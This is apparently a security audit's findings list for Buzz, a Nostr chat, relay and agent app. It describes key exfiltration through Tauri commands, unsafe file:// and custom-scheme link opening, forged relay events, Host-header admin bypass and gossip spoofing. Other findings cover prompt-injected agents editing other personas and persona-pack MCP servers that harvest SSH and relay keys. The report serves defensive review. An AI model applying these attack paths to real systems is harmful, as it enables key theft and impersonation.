findings.claim: get_nsec is a Tauri command with no access control that returns the raw bech32-encoded secret key to any caller from the renderer/JS context.
findings.failure_scenario: Any XSS'd webview content, a malicious dependency loaded into the frontend bundle, or a compromised renderer process can call invoke('get_nsec') and immediately obtain the user's full private key in plaintext, with no confirmation dialog, rate limit, or additional authentication required from Rust's side.

findings.claim: confirm_pairing_sas is a Tauri command that unconditionally proceeds to send the pending payload (which embeds the user's nsec, built in start_pairing) once called — there is no server-side (Rust) verification that the SAS codes actually matched; the 'confirmation' is purely the renderer calling this function.
findings.failure_scenario: A compromised renderer script calls start_pairing() (returning the QR/session URI, which encodes the pairing session so a remote attacker can act as the pairing peer over the relay) and then immediately calls confirm_pairing_sas() without any human visually comparing SAS codes. Because the SAS check is a UI-only human decision never re-validated in Rust, the payload (JSON containing the raw nsec, see line 111-115) is sent over the pairing relay session to whatever peer completed the offer/SAS steps — letting a remote attacker who scripted the peer side of the protocol exfiltrate the full identity secret key with only renderer-JS execution, no physical device access or user interaction.

findings.claim: start_pairing builds a payload embedding the plaintext nsec entirely in response to a renderer-invoked command, before any peer device has been verified via SAS.
findings.failure_scenario: Combined with the confirm_pairing_sas gap above, the raw nsec is placed into a JSON string held in memory and later transmitted; if the outbound relay connection or the peer-selection logic can be influenced (e.g. via a spoofed NIP-11 pairing_relay_url from a malicious/compromised relay, see probe_pairing_relay/pairing_relay_from_nip11), the destination of this nsec-bearing payload is not something the renderer's caller strongly controls beyond triggering the flow.

findings.claim: Any href that is not a recognized `buzz://message?...` deep link (including arbitrary custom URI schemes, `file://`, or other `buzz://` sub-paths crafted by a relay-controlled message author) falls through to `openExternal`, which is wired to the OS URL opener (`openUrl`) with no scheme allow-list.
findings.failure_scenario: An attacker posts a message/link-card with an href like `file:///C:/Users/victim/secrets.txt`, a registered custom protocol handler for another installed app, or a Windows `ms-*:`/`search-ms:` URI. When the victim clicks the rendered link or link-edit card, `openPopoverLink`/`useLinkEditor.tsx`'s `openCardUrl` hands the raw string straight to `openUrl(url)` with no scheme check, letting attacker-supplied Nostr content trigger local file access or an arbitrary installed protocol handler.

findings.claim: `renderHTML` takes `node.attrs.src` (ultimately derived from another member's NIP-30 kind:30030 `emoji` tag URL, resolved via `resolveUrl`) and passes it through `rewriteRelayUrl` with no scheme/host validation before setting it as an ``.
findings.failure_scenario: A community member publishes a kind:30030 custom-emoji set (or a reaction event's `["emoji", shortcode, url]` tag) with `url` set to a `file://` path or an attacker-controlled tracking/exfiltration endpoint; any peer whose composer or timeline resolves that shortcode renders an `` pointing at it, causing an unsolicited network request (or local file read attempt) driven entirely by untrusted relay content.

findings.claim: reader_authorized_for_event() — documented as closing the 'kindless ids:[…] lookup' read-authorization bypass for every relay delivery surface (WS historical pull, HTTP bridge, live fan-out) — only actually gates KIND_DM_VISIBILITY and KIND_AGENT_TURN_METRIC (RESULT_GATED_KINDS). kind.rs separately defines a broader P_GATED_KINDS set (KIND_AGENT_OBSERVER_FRAME, KIND_MEMBER_ADDED_NOTIFICATION, KIND_MEMBER_REMOVED_NOTIFICATION, KIND_GIFT_WRAP, plus the two above) documented as needing #p-bound read access. If any caller relies on reader_authorized_for_event as the last-line defense against the kindless-ids bypass — as its own doc comment implies — gift-wrap DMs (kind:1059), agent observer frames (kind:24200), and member add/remove notifications (kind:44100/44101) are not covered by this specific result-level gate.
findings.failure_scenario: A relay client sends a REQ filter {"ids":["<known event id of another user's gift-wrapped DM or observer frame>"]} with no kind/#p constraint. If the read path calls reader_authorized_for_event() as its sole per-event gate rather than re-deriving the filter-layer #p rule for P_GATED_KINDS, the event is returned to a reader not in its #p tag, leaking DM/telemetry content to a non-owner.

findings.claim: decrypt_observer_payload() decrypts NIP-44 content keyed off event.pubkey without ever calling event.verify()/verify_signature(), unlike buzz-core's own pairing/session.rs decrypt path (validate_event_basics() there explicitly calls event.verify() before decrypt_message()). If a caller passes an event straight from the wire into decrypt_observer_payload (or the agent_turn_metric wrappers built on it) before running it through verify_event(), the function decrypts using an attacker-supplied, unverified pubkey/content pair with no defense-in-depth check at this layer.
findings.failure_scenario: A caller in another crate reads an observer-frame or agent-turn-metric event off a relay subscription and passes it directly to decrypt_observer_payload/decrypt_agent_turn_metric without first calling buzz_core::verify_event. NIP-44 authenticated encryption means a spoofed event just fails to decrypt rather than leaking data, but the crate offers none of the explicit verify()-before-decrypt discipline it uses elsewhere, so any future code path that trusts event.pubkey before decryption (e.g. for logging/auditing) would silently inherit an unverified value.

findings.claim: The mobile app's primary NostrEvent model, used to parse every EVENT frame received from a relay over the main channel/message/timeline subscription pipeline (relay_session.dart), never verifies the event's id (SHA-256 of canonical serialization) or its Schnorr signature. NostrEvent.fromJson simply copies the id/pubkey/sig fields out of untrusted JSON with no cryptographic check. This is inconsistent with the app's own NIP-AB pairing code path (pairing_provider.dart line ~337), which explicitly re-parses relay-delivered events with `nostr.Event.fromJson` specifically because, per its own comment, 'The nostr package's Event.fromJson verifies id + sig on construction' — showing the team knows how to verify and does so in one path but omitted it in the far more heavily used one.
findings.failure_scenario: A malicious or compromised relay (or a MITM if the operator's deployment terminates TLS elsewhere, per SECURITY.md's statement that 'the relay itself does not enforce TLS'), or any relay the user connects to via an invite/pairing deep link, can send an EVENT frame with an arbitrary pubkey, content, kind, and tags with a bogus or unchecked id/sig. relay_session.dart's `_handleEvent` (around line 449) calls `NostrEvent.fromJson(eventJson)` directly and hands the resulting event to channel timelines, DMs, profile metadata (ProfileData.fromEvent), and command responses with no signature check anywhere downstream, so the forged event is rendered to the user as if genuinely authored and signed by the claimed pubkey — enabling message spoofing/impersonation of any user or agent in a channel.

findings.claim: Gossip records applied via apply_gossip_record (and the underlying GossipState::apply_delta in gossip.rs) are keyed only by an unauthenticated runtime_id field inside the record with last-version-wins semantics, unlike ReadyRecord which is bound to its runtime_id by a relay-key Schnorr signature. Any peer already admitted to the mesh can gossip a GossipRecord claiming to be a different runtime_id with an inflated version number and attacker-chosen endpoint_addrs, and every peer that receives it will silently overwrite that runtime's membership entry.
findings.failure_scenario: A single compromised or malicious pod (admitted to the mesh because it holds the deployment's shared relay signing key used to sign ReadyRecord, or because it dialed in first) sends a Gossip Delta frame containing a GossipRecord{runtime_id: <victim_pod_id>, version: u64::MAX, endpoint_addrs: [attacker_ip], ...} over its already-established control stream. apply_gossip_record (and delta_for/apply_delta in gossip.rs) accept it purely because record.version compares higher than the existing entry, with no check that the authenticated sender's runtime_id (known from the iroh connection identity) matches record.runtime_id inside the payload. Every other pod that later gossips with the attacker (directly or transitively, since gossip is store-and-forward scuttlebutt) now redials the victim's runtime_id at the attacker's address, letting the attacker's node intercept or black-hole ReliableStream/RealtimeMedia session traffic meant for the victim relay.

findings.claim: build_moderation_ban (and similarly build_moderation_timeout / build_moderation_resolve_report) accepts an operator-supplied `reason` string and writes it into a signed event tag with no length or control-character check, unlike every comparable free-text field elsewhere in the same file (check_content caps message/content at 64KiB, and the NIP-IA identity-archive path's check_reason caps `reason` at 64 UTF-8 bytes and rejects control characters).
findings.failure_scenario: A moderator (or a compromised mod-token/agent) calls build_moderation_ban with a multi-megabyte or control-character-laden `reason`; the resulting kind:9040 event carries an oversized/unsanitized tag value that downstream consumers (audit logs, reporter-facing DM per the resolve_report doc comment, admin UI) must handle defensively, whereas the SDK's own convention elsewhere is to enforce these bounds at construction time.

findings.claim: query_events_on clamps `limit` to DEFAULT_MAX_PAGE_LIMIT (or the caller's max_limit) but leaves `offset` completely unbounded, even though offset is part of the same EventQuery struct that is explicitly documented as the enforcement point for the relay's advertised NIP-11 page-size ceiling.
findings.failure_scenario: If any caller threads a client-supplied pagination offset into EventQuery.offset without its own cap, a request with an enormous OFFSET forces Postgres to scan and discard that many matching rows before applying LIMIT — an inexpensive request to send but an expensive one to serve, since the composite ORDER BY here has no covering index for the trailing `id ASC` tiebreaker (the file's own comment above notes Postgres sorts in memory for this).

findings.claim: Events arriving over the live WebSocket subscription (`EVENT` frames) are dispatched straight to UI subscribers (`handleEvent` -> `eventBuffer` -> `subscription.onEvent(event)`) without any client-side check that `event.id` matches the SHA-256 of its canonical serialization or that `event.sig` is a valid Schnorr signature over that id/pubkey. The only place in this slice that calls `verifyEvent` (lib/authors.ts) is a narrow authorship-attribution check gated on `signerPubkey === relaySelfPubkey`, not a general validation applied to every incoming event.
findings.failure_scenario: If the community relay is compromised, malicious, or simply buggy, it can emit events with a forged `pubkey`/`content`/`tags` combination (or a mismatched id) and this client will render them as if genuinely authored and integrity-checked, since nothing between the raw `JSON.parse(payload)` in `handleWsMessage` and the UI callback validates the id or signature. This matters specifically because SECURITY.md documents server-side NIP-42/NIP-98 signature verification but the desktop client itself performs no redundant/defense-in-depth verification of relay-delivered events before display.

findings.claim: Markdown links parsed from relay-delivered message content are opened via `openUrl(href)` (Tauri's shell/OS opener) from the right-click "Open link" menu, and rendered as a normal `<a href={href} target="_blank">` for left-click, with no allowlist restricting the URL scheme (e.g. to `http:`/`https:`) before either action.
findings.failure_scenario: Message content is attacker-controlled (any relay member, or a malicious/compromised relay per the finding above, can post arbitrary markdown). A crafted link with a non-http scheme (e.g. a registered custom protocol handler, or a `file:`/platform-specific URI) passed to `openUrl` is handed to the OS's default handler for that scheme, potentially invoking another installed application with attacker-chosen arguments embedded in the URL — a known desktop-app attack vector for untrusted-content link openers.

findings.claim: MediaConfig derives Debug while holding s3_secret_key (and s3_access_key) as plain String fields, so any future `{:?}`/`tracing::debug!`/panic-message formatting of a MediaConfig value (e.g. in buzz-relay startup logging, error contexts, or a debug endpoint) would leak the S3 secret key into logs.
findings.failure_scenario: A developer adds `tracing::debug!(?config, "loaded media config")` or a panic/`unwrap_or_else` message that interpolates `{config:?}` somewhere the config is threaded through (startup, config-reload, or an admin diagnostics handler) in buzz-relay; the S3 secret key is then written to log output/log aggregators, effectively an S3 credential leak.

findings.claim: A persona pack's MCP server entries (from pack-level `.mcp.json` or per-persona frontmatter `mcp_servers:`) are parsed into `command`/`args`/`env` with zero validation — any string is accepted as an executable to spawn. Since persona packs are the unit distributed/shared/installed (akin to a plugin marketplace), an untrusted or compromised pack can declare an MCP server that is later spawned as a real child process by buzz-agent (see crates/buzz-agent/src/mcp.rs spawn_one), giving the pack author arbitrary code execution on the user's machine the moment the persona is loaded/enabled — no sandboxing, allowlist, or user confirmation of the command path is visible in this crate.

findings.claim: `spawn_one` executes `Command::new(&spec.command)` with args/env taken directly from the configured MCP server list (which, via buzz-persona, can originate from an untrusted persona-pack manifest) and re-adds a fixed PASSTHROUGH_ENV allowlist that includes `SSH_AUTH_SOCK`, `GIT_SSH_COMMAND`, `BUZZ_PRIVATE_KEY`, `BUZZ_RELAY_URL`, `BUZZ_AUTH_TAG`, and all proxy vars before layering the server's own `spec.env` on top. A persona-pack-declared MCP server therefore gets access to the SSH agent socket and Buzz relay identity material simply by being declared, without any distinction between operator-configured (trusted) servers and pack-supplied ones.
findings.failure_scenario: A persona pack ships an MCP server whose real purpose is to read `SSH_AUTH_SOCK` (usable to sign SSH auth requests as the user) or to read `BUZZ_PRIVATE_KEY`/`BUZZ_AUTH_TAG` from its environment and exfiltrate them over the network — the tool description shown to the operator can be innocuous while the spawned process silently harvests these env vars on startup.

findings.claim: `resolve_path` (used by `read_file`, `str_replace`, and `view_image`) explicitly performs no containment check against the workspace root — any absolute path, or a relative path with `..`, resolves and is read/written outside the sandbox. This is documented as intentional ("consistent with the shell tool's posture") and covered by a test (`resolve_path_allows_outside_workspace`) that asserts a symlink escaping the workspace succeeds. Combined with the `shell` tool's equally unrestricted command execution, any content that can steer buzz-dev-mcp tool calls (e.g. via prompt injection embedded in relay-fetched content, workflow output, or a persona's system prompt) can read/write/exec anywhere the OS user can, including files outside any 'workspace' boundary an operator might assume exists.
findings.failure_scenario: An agent session is driven to call `read_file` with `path: "/c/Users/<user>/.ssh/id_ed25519"` (or `str_replace` on an arbitrary config file) via a workdir escape or MSYS-style absolute path; `resolve_path` happily canonicalizes and returns it since there is no root-containment check.

findings.claim: The entire read-only deployment-admin API (moderation reports, product feedback, and feedback attachments) is gated solely by comparing the client-supplied HTTP `Host` header (and `Origin` header) against a configured admin hostname string — there is no bearer token, session, or Nostr-signature check on these routes.

Any client that can reach the relay's port — which is guaranteed since it's the same socket as public API/WS traffic — can set an arbitrary `Host: <admin-host-value>` header on a raw HTTP request (curl, not a browser, so the Origin check is also moot for non-browser clients) and read `/api/admin/v1/reports`, `/feedback`, and `/feedback/{id}/attachments/{sha256}` without any credential, as long as they know or guess the configured admin hostname string (which is not treated as a secret anywhere else in the config, e.g. it may appear in TLS SNI/certificate logs or DNS).

If any current or future handler treats require_scope(scopes, Scope::AdminChannels) as sufficient authorization for an admin action rather than layering a real role/ownership check on top (ingest.rs's own comment at line 228 says the 'command handler owns' that further check), that action becomes exercisable by an arbitrary, non-privileged Nostr identity — a privilege-escalation trap baked into the scope model itself.

findings.claim: The Nip98ReplayGuard::try_mark default method forwards ttl_secs to try_mark_in_scope completely unclamped; the floor (DEFAULT_REPLAY_TTL_SECS) and ceiling (MAX_REPLAY_TTL_SECS) are stated only as doc-comment 'MUST' requirements (lines 87-94), not enforced in shared code. Only the concrete RedisNip98ReplayGuard in crates/buzz-pubsub/src/nip98_replay.rs (line 48: ttl_secs.clamp(DEFAULT_REPLAY_TTL_SECS, MAX_REPLAY_TTL_SECS)) actually performs the clamp.
findings.failure_scenario: Any second implementation of Nip98ReplayGuard (a new backend, a test double promoted to production, or a future in-memory/alternate store) that forgets to replicate the clamp inherits a TTL floor/ceiling violation silently: a caller-supplied sub-floor TTL would shrink the replay window below the verifier's ±60s clock-skew tolerance (the same file's docstring at lines 1-31 warns this reopens the replay window), or an above-ceiling TTL could overflow a differently-backed store's TTL argument. This is exactly the cross-crate duplication/divergence risk flagged between buzz-auth and buzz-pubsub for NIP-98 replay logic.

The authors document this as an intentional trade-off (URL + ±60s timestamp + pre-receive hook substitute for method binding), so this is a design decision rather than an oversight, but it means buzz_auth's verify_nip98_event method-check parameter provides zero security value on this call path, and any assumption elsewhere that 'NIP-98 verification binds the HTTP method' does not hold for git routes.

findings.claim: queryEvents() pushes every relay-supplied EVENT payload straight into the results array and returns it to callers with no signature or id verification anywhere in the module (or anywhere else in the web slice — grep for verifyEvent/verifySignature found zero matches).
findings.failure_scenario: A malicious or compromised relay (or a MITM on the WebSocket, or any code path that can inject EVENT frames) can send an event with an arbitrary `pubkey` field and fabricated `id`/`sig` that is never checked. Every consumer (use-repos.ts eventToRepo(), use-repo-refs.ts parseRefs()) trusts `event.pubkey` as the content's signer/owner and renders it as-is (PubkeyAvatar, repo owner/contributor lists), so an attacker-controlled relay can impersonate any pubkey to the browser client with no cryptographic contradiction ever surfacing to the user.

findings.claim: fetchRepoRefs queries kind:30618 (repo refs) events by `#d` tag only, with no `authors` filter restricting to the relay's own pubkey — the code has a TODO acknowledging that any community member with ReposWrite permission can publish a spoofed kind:30618 event that will be blended into the displayed branches/tags/HEAD for someone else's repo.
findings.failure_scenario: Any user holding ReposWrite (a role short of repo ownership) publishes a kind:30618 event with the target repo's `d` tag but attacker-chosen `refs/heads/*` values; since dedup() only keys on (pubkey, kind, d) and parseRefs() merges tags across all matching events without checking which pubkey should be authoritative, this can inject a bogus branch name or HEAD SHA into the repo browser UI other users see, e.g. steering them toward a malicious ref during 'Run' HTML preview or clone.

findings.claim: An agent-originated update request targets a persona to edit purely by case-insensitive display-name match across ALL locally editable personas, not by any stable identifier tied to the requesting agent itself, so a request from agent A can pre-fill an edit dialog for a completely different persona B merely by guessing/matching B's display name.
findings.failure_scenario: A managed agent A is compromised or prompt-injected (e.g. via content in a shared channel it reads) into emitting an `agent_management_request` update action with `agentName` equal to another of the user's agents B's display name. `classifyAgentManagementOrigin` only checks that A is an owned agent and a member of the claimed channel — it does not check that B is related to that channel or to A at all. `matchingPersonas` then resolves purely on `displayName` equality, so the update dialog opens pre-filled with proposed changes (systemPrompt/runtime/provider/model/respondTo) to persona B. Although a human must click Save in the resulting dialog, the dialog does not warn that the request came from a different agent than the one being edited, so a user who trusts the flow could apply attacker-influenced changes (e.g. widening `respondTo` to "anyone", or altering B's system prompt) to the wrong agent.

findings.claim: The persona catalog projection accepts an attacker-controlled `system_prompt` (and `runtime`/`provider`/`model`) of unbounded length/content from any relay-published `kind: KIND_PERSONA` event with a `["shared","true"]` tag, with no length cap or content sanitization before it can be copied into a real local persona that later drives an actual agent invocation.
findings.failure_scenario: Any Nostr identity can publish a `KIND_PERSONA` event tagged `shared:true` to the relay. `parsePersonaContent` only requires `display_name` to be a non-empty string; `system_prompt` is accepted as-is if it is a string, with no size limit (contrast with the avatar fields, which do have explicit length caps like `MAX_INLINE_SVG_AVATAR_LENGTH`/`MAX_INLINE_RASTER_AVATAR_LENGTH`). A malicious or careless publisher could push a very large or adversarially crafted system prompt into the shared catalog that gets adopted by other users who click "Add" from the catalog UI, becoming the operating instructions for a real running agent.

findings.claim: The Tauri app config sets `app.security.csp` to `null`, which disables Tauri's Content-Security-Policy injection entirely for the webview that renders relay-supplied content (messages, profiles, media).
findings.failure_scenario: Nostr event content (message bodies, profile metadata, embedded HTML/markdown rendering) is attacker-controlled since it comes from arbitrary relays/peers per the domain brief. If any renderer path fails to escape relay-supplied content (a known recurring Nostr-client bug class), the resulting XSS runs with zero CSP restriction on script-src/connect-src/img-src, making arbitrary script execution, fetch-based exfiltration to attacker origins, and IPC bridge abuse all unmitigated by a defense-in-depth layer that Tauri specifically provides for this purpose. No comment or SECURITY.md entry documents why CSP is intentionally disabled (grepped docs/SECURITY.md — no CSP justification found).

findings.claim: The egress guard on the native-websocket send path (`send_message`) only inspects `WebSocketMessage::Text` and `WebSocketMessage::Binary` frames for the `ncryptsec1` key-backup marker; `Ping`/`Pong`/`Close` frame payloads fall through the `_ => {}` arm unchecked, even though `Ping`/`Pong` carry an attacker-controllable `Vec<u8>` payload from the webview.
findings.failure_scenario: A compromised or malicious renderer (e.g. via an XSS bug, which is more plausible given CSP is disabled per the sibling finding) that can call the `websocket:send` Tauri command could put the local NIP-49 `ncryptsec` backup (or a chunk of it) into a WS Ping/Pong control-frame payload and exfiltrate it to the connected relay, defeating the fail-closed guarantee the module's own doc comment (egress_guard.rs lines 1-24) claims: 'must NEVER be transmitted to a relay' at 'every relay-bound egress boundary'. The guard's own test suite (egress_guard_tests.rs::boundary_native_websocket_blocks_ncryptsec) only exercises Text and Binary variants, confirming Ping/Pong were not considered when the boundary was designed.

findings.claim: The local media-proxy origin check only rejects requests when the Origin header is present and mismatched; a request with no Origin header at all is let through unconditionally, deliberately (per the comment) for <video> element fetches, but this also lets any other local HTTP client on the loopback port skip the same-origin check entirely.
findings.failure_scenario: Because the proxy binds to 127.0.0.1:{port} only, this is not remotely exploitable, but any other local process/malware on the same machine that discovers the ephemeral port can issue a bare HTTP GET with no Origin header and retrieve relay media through the app's own minted auth token (mint_media_get_auth), since the origin filter is designed to block cross-origin browser JS fetches, not arbitrary local clients.

findings.claim: parse_relay_message deserializes a relay-supplied EVENT frame into a typed nostr::Event via serde_json and hands it straight to the caller (as RelayMessage::Event) without ever calling event.verify() to check that the event's id matches SHA-256 of its canonical serialization or that its Schnorr signature matches the claimed pubkey.
findings.failure_scenario: A relay (or anyone able to inject frames into the WS session) sends ["EVENT","<sub>",{...forged event with someone else's pubkey/id and garbage or no matching sig...}] over the wire. buzz-ws-client parses it into an Event and returns it as genuine; buzz-test-client (crates/buzz-test-client/src/lib.rs, which does `RelayMessage::Event { subscription_id, event } => events.push(*event)` with no verify() in between) and callers via buzz-cli consume it as if it were authentically signed by that pubkey.

findings.claim: verify_chain only checks that hashes are internally consistent within the requested [from_seq, to_seq] window (expected_prev starts at None and is only updated from rows inside the fetched range); it never checks that the first row's prev_hash matches the hash actually stored at from_seq-1 in the full chain, so verifying a sub-range starting above seq 1 cannot detect that earlier entries outside the window were deleted or replaced.
findings.failure_scenario: An operator or attacker with DB write access deletes/rewrites audit_log rows before seq N, then a caller runs verify_chain(community, N, M) expecting a clean integrity check; the function returns Ok(true) because the window is self-consistent, even though the chain's link into the deleted prefix was severed — giving false assurance that the audit trail back to genesis is unbroken when only the window itself was checked.

findings.claim: When a managed agent is created, its nsec private key is rendered in plaintext directly in the DOM with no mask/reveal gate, unlike the equivalent PrivateKeyBackupRow/NsecMaskedDisplay flow used elsewhere for the user's own identity key, which masks the key until an explicit reveal click and clears it on unmount.
findings.failure_scenario: A user creates an agent while screen-sharing, using a screen reader, or with a browser/webview extension that scrapes DOM text; the agent's private key (privateKeyNsec) is exposed in cleartext in the accessibility tree and DOM from the moment the dialog opens, with no user action required to reveal it — inconsistent with the app's own stated security invariant elsewhere ('nsec is not present in the DOM until the user clicks Reveal').
findings.evidence: {created.privateKeyNsec}

findings.claim: The production single-node/VPS deployment bundle (deploy/compose/, name: buzz-prod) defaults the relay container to the floating, mutable `:main` tag rather than a pinned release version or digest when BUZZ_IMAGE is not overridden.
findings.failure_scenario: An operator follows the documented quick-start (`cp .env.example .env; $EDITOR .env # replace every CHANGE_ME value`) and, since BUZZ_IMAGE has no CHANGE_ME placeholder to prompt editing, leaves it unset. Every `docker compose up`/restart on that host then pulls whatever ghcr.io/block/buzz:main currently resolves to — the latest unreleased main-branch build, or a compromised/overwritten `main` tag if the GHCR account or CI publishing credentials were ever compromised — with no version pinning or reproducibility for a production instance holding real user data (Postgres, Redis, S3 media, git repos).
findings.evidence: image: ${BUZZ_IMAGE:-ghcr.io/block/buzz:main}

findings.claim: useDeleteMessageMutation.onSuccess removes the deleted message only from the flattened channelMessagesKey cache, not from the window store — violating the codebase's own documented invariant (channelWindowStore.ts:229-238 and the edit mutation's comment at hooks.ts:745-747 both state that patches applied only to the flattened array are silently reverted by the next live merge). The deleted row is resurrected by the next projection.
findings.failure_scenario: User deletes their message (DeleteMessageConfirmDialog → useDeleteMessageMutation). onSuccess filters it out of channelMessagesKey, but the event remains in the ChannelWindowStore pages/liveOverlay. Any subsequent live event in the channel (any member sending a message triggers appendMessage at hooks.ts:264 → mergeLiveChannelWindowEvent → projectChannelWindowMessages → reconcileChannelWindowMessages, which re-emits every window event as authoritative) puts the deleted message back into the rendered timeline. It stays visible until the relay's kind-5/9005 deletion aux event arrives and formatTimelineMessages suppresses it; if that push is missed (brief disconnect at delete time), the deleted message remains visible until the next head refetch. The sibling edit mutation (hooks.ts:748-752) was explicitly fixed for this exact bug class via mapChannelWindowEvents; the delete path was not.

findings.claim: fillSlot writes a descriptor at a stale slot index with no bounds check against the current slots array. When setPendingImeta replaces/shrinks the slots (composer clears attachments on send, or restores a draft) while a drop/paste upload is still in flight, the write lands past the array end, creating a sparse array with holes; the stale attachment then reappears in the next message's composer, and a later append via spread ([...prev, descriptor] in onUploaded) converts the holes to undefined, which the type-guard filter (d) => d !== null passes through (undefined !== null is true) into pendingImeta.
findings.failure_scenario: User drags a large file into the composer (handleDrop reserves slotIndex 3 via reserveSlots) and hits send before the upload finishes; MessageComposer calls setPendingImeta([]) which resets nextSlotRef to 0. The in-flight upload completes and fillSlot(3, descriptor) executes [...[]] then next[3]=descriptor, producing [<3 holes>, descriptor]: (a) the attachment meant for the sent message silently attaches to the NEXT message draft; (b) the user then pastes an image — onUploaded spreads the sparse array, holes become undefined, and pendingImeta now contains undefined entries, so the originals-prune effect at line 233 (pendingImeta.map((d) => d.url)) and attachment renderers throw TypeError reading 'url' of undefined, crashing the composer.

findings.claim: The catch-up effect's cleanup unconditionally releases the caughtUpChannelsRef claims for every channel in toFetch, including channels whose catch-up already completed successfully (success never marks a claim permanent). Since the effect re-runs whenever channelIdsKey changes, any genuine membership change (joining or leaving one channel) re-issues the catch-up REQ (limit 1000 events each) for every channel in the workspace, defeating the ref's stated purpose of one catch-up per channel per session.
findings.failure_scenario: User is in 50 channels; all 50 catch-up REQs complete and populate unread state. User joins one new channel → channelIdsKey changes → cleanup deletes all 50 completed claims → the new effect run's toFetch is all 51 channels → 51 fresh REQs of up to 1000 events each are issued against the relay instead of 1. On a workspace with frequent join/leave churn this multiplies relay load and delays unread-badge convergence; the merges themselves are idempotent so no data corruption, but the comment at lines 250-253 ('Prevents re-fetching on every channels-list refetch') is not upheld for real membership changes.

findings.claim: The shouldContinue cancellation guard passed to pageOlderMessagesUntilRowFloor is a tautology: channelId is derived from channel?.id in the same render closure (line 16: const channelId = channel?.id ?? null), so the closure captured by useCallback always compares a value to itself and never returns false, even after the user switches channels mid-fetch.
findings.failure_scenario: User scrolls up in channel A triggering fetchOlder, then switches to channel B while the page request is in flight. The guard '() => channelId === channel?.id' evaluates against the OLD captured channel object, so both sides are channel A's id and it returns true; runPage proceeds to parse and append the page for the abandoned channel. Harm is limited because the write is keyed per channel, but the intended abort path is dead code, and if a reconnect resync replaced channel A's window pages during the await, appendOlderChannelWindow throws 'Channel page does not continue the retained cursor chain' (caught and logged as 'Failed to fetch older messages'), wasting the fetched page.

findings.claim: syncSubs re-bumps dmSubscriptionStartedAtRef to the local wall clock on EVERY effect run with a non-empty target set — including runs where the DM channel's subscription already existed and persists (the diff manager only adds/removes deltas). handleDmEvent (line 203) then suppresses any DM whose sender-supplied created_at is below that freshly bumped local timestamp, so live DMs racing in around a channel-list change, or sent from a device whose clock is a few seconds behind, are silently dropped from notifications.
findings.failure_scenario: User's channel list changes (joins any channel) → effect re-runs → dmSubscriptionStartedAtRef jumps to local now. A DM sent one second earlier from a peer whose clock lags 3 seconds is delivered over the long-lived DM subscription with created_at < startedAt and handleDmEvent returns at the backlog-suppression check — no notification fires, no error is logged, and there is no catch-up path for missed DM notifications. The comparison of a sender-controlled created_at against the local clock makes ordinary clock skew sufficient; the unnecessary re-bump on every sync widens the window from once-per-session to once-per-membership-change.

findings.claim: useLoadMissingAncestors has no call sites anywhere in desktop/src (verified by grep), and its implementation is doubly broken if revived: it merges fetched ancestor events into the flattened channelMessagesKey cache only, so root ancestors (parentId null) are dropped by the next projectChannelWindowMessages pass (retainRefetchReconciliationEvents in channelWindowReconciliation.ts:13-20 retains only pending events and non-broadcast thread replies), and a failed getEventById leaves the id permanently in requestedAncestorIdsRef so it is never retried until channel switch.
findings.failure_scenario: Currently none — the hook is dead code (only its own definition matches 'LoadMissingAncestors' in the tree). If a future caller wires it up expecting reply-context resolution: a reply whose root is older than the loaded window gets its root fetched and merged, the next live event re-flattens the window store over the cache and the root vanishes again, and the requested-id guard prevents any refetch — the reply's parent context is permanently unresolved for the session. Reported at LOW confidence for user impact precisely because no reachable entry point exists today.

findings.claim: readActivityFromStorage validates only that each persisted item is an object with a string id; the other ThreadActivityItem fields (tags, createdAt, content, channelId, kind, pubkey) are asserted via the type predicate without being checked, so a truncated or corrupted localStorage row (e.g. written by a partial quota-limited write or an older schema) flows into consumers typed as ThreadActivityItem.
findings.failure_scenario: A buzz-thread-activity.v1 localStorage entry is corrupted so an item is {id:"abc"} with no tags array. readActivityFromStorage returns it as a ThreadActivityItem; addThreadActivityItems sorts by item.createdAt (undefined — NaN comparisons scramble order silently) and Home-feed consumers that call item.tags.find/getThreadReference(item.tags) throw TypeError reading 'find' of undefined, breaking the activity feed until the storage key is cleared. Low confidence on the exact crash site since the Home feed consumer is outside this slice's paths.

findings.claim: `sign_nostr_identity_binding` is the only signing command in identity.rs that reads `state.keys.lock()` directly instead of `state.signing_keys()`, so it bypasses the recovery-mode gate that refuses signing when `identity_lost` or `keyring_locked` is set. Every neighbouring signer in the same file (`sign_event` L115, `create_auth_event` L646, `build_observer_control_event` L170, `nip44_encrypt_to_self` L672, `get_nsec` L192, `create_backup_with_log_n` L232) goes through `signing_keys()`; this one does not.
findings.failure_scenario: The user's OS keyring is wiped or unreadable at boot, so `resolve_identity` sets `identity_lost`/`keyring_locked` and `state.keys` holds a throwaway ephemeral keypair that will not survive the next launch (app_state.rs:306-322 is what normally blocks all signing in this state). While the recovery banner is up, the user clicks a `buzz://nostr-bind?challenge_id=...&nonce=...&verification_code=...&origin=https://site.example&expires_at=...` deep link (deep_link.rs:246-281, 369), consents in NostrBindConsentDialog, and the command signs a kind:KIND_NOSTR_IDENTITY_BINDING event with the ephemeral key. The external site records that pubkey as the user's permanent Nostr identity. On the next launch the ephemeral key is gone, so the binding points at a key nobody controls — and any attacker who can reach that binding endpoint before it is revoked speaks as the 'bound' identity. The same path also lets the ephemeral key be bound while `keyring_locked`, i.e. while the user's real key still exists but is unreachable.
findings.evidence:
let keys = state
        .keys
        .lock()
        .map_err(|error| error.to_string())?
        .clone();

findings.claim: The NIP-09 ownership check in `parse_deletion_coordinate` (L219: `if owner != event.pubkey.to_hex() { return None; }`) is self-referential and therefore vacuous: it only requires the coordinate to name its own signer as owner. The subsequent local-store removals key on the attacker-chosen d-tag alone and never compare the record's owner, so a validly signed kind:5 from ANY keypair deletes the local persona / team / managed-agent record whose d-tag matches. The comment at L216-218 claims this check 'closes the other half — a validly signed kind:5 naming ANOTHER owner's coordinate must no-op', which the code does not achieve.
